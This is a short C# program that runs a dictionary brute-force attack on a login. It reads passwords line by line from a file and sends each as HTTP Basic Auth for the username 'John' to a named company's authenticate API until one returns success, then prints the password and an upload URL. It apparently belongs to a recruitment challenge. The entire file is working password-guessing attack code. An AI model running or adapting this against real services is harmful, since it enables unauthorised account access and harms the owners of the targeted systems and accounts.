﻿using System;
using System.IO;
using System.Net;
using System.Text;

class Program
{
    static void Main()
    {
        string username = "John"; // Username for authentication
        string url = "http://recruitment.warpdevelopment.co.za/api/authenticate"; // API endpoint
        string dictionaryFile = "dict.txt"; // Dictionary file containing possible passwords

        // Read all password variations from dict.txt
        foreach (string password in File.ReadLines(dictionaryFile))
        {
            // Encode username:password in Base64 for Basic Authentication
            string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes($"{username}:{password}"));

            // Create HTTP GET request
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.Headers["Authorization"] = "Basic " + credentials;

            try
            {
                // Send the request and get the response
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        Console.WriteLine($"✅ Success! Password: {password}");

                        // Read API response to get the upload URL
                        using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                        {
                            string responseText = reader.ReadToEnd();
                            Console.WriteLine($"Upload URL: {responseText}");
                        }
                        break; // Stop once successful login is found
                    }
                }
            }
            catch (WebException ex)
            {
                // Handle authentication failure and other errors
                if (ex.Response is HttpWebResponse errorResponse && errorResponse.StatusCode == HttpStatusCode.Unauthorized)
                {
                    Console.WriteLine($"❌ Failed: {password}"); // Incorrect password
                }
                else
                {
                    Console.WriteLine($"⚠️ Error: {ex.Message}"); // Other errors like network issues
                }
            }
        }
    }
}
